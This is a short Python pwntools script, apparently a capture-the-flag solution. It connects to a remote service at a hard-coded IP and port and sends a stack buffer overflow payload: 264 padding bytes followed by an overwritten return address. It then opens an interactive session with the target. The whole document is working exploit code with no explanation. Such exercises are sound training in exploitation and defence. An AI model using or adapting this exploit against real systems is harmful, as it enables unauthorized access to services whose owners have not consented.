from pwn import *
p = remote('54.85.45.101', 8008)

payload = b'A' * 264
payload += p64(0x401176)

p.sendline(payload)
p.interactive()